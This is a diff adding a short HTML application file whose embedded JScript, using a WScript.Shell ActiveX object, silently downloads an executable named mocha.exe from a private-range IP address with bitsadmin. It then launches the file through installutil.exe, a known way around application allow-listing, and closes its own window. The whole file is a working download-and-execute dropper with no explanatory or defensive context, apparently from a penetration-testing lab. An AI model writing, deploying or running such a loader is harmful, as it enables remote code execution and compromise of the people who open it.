@@ -1,0 +1,14 @@
+<html> 
+<head> 
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var cmd = "cmd.exe /c bitsadmin /transfer job /download /priority high http://192.168.45.187:8080/mocha.exe C:\\Windows\\Tasks\\mocha.exe & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\mocha.exe";
+var res = shell.Run(cmd, 0, true);
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
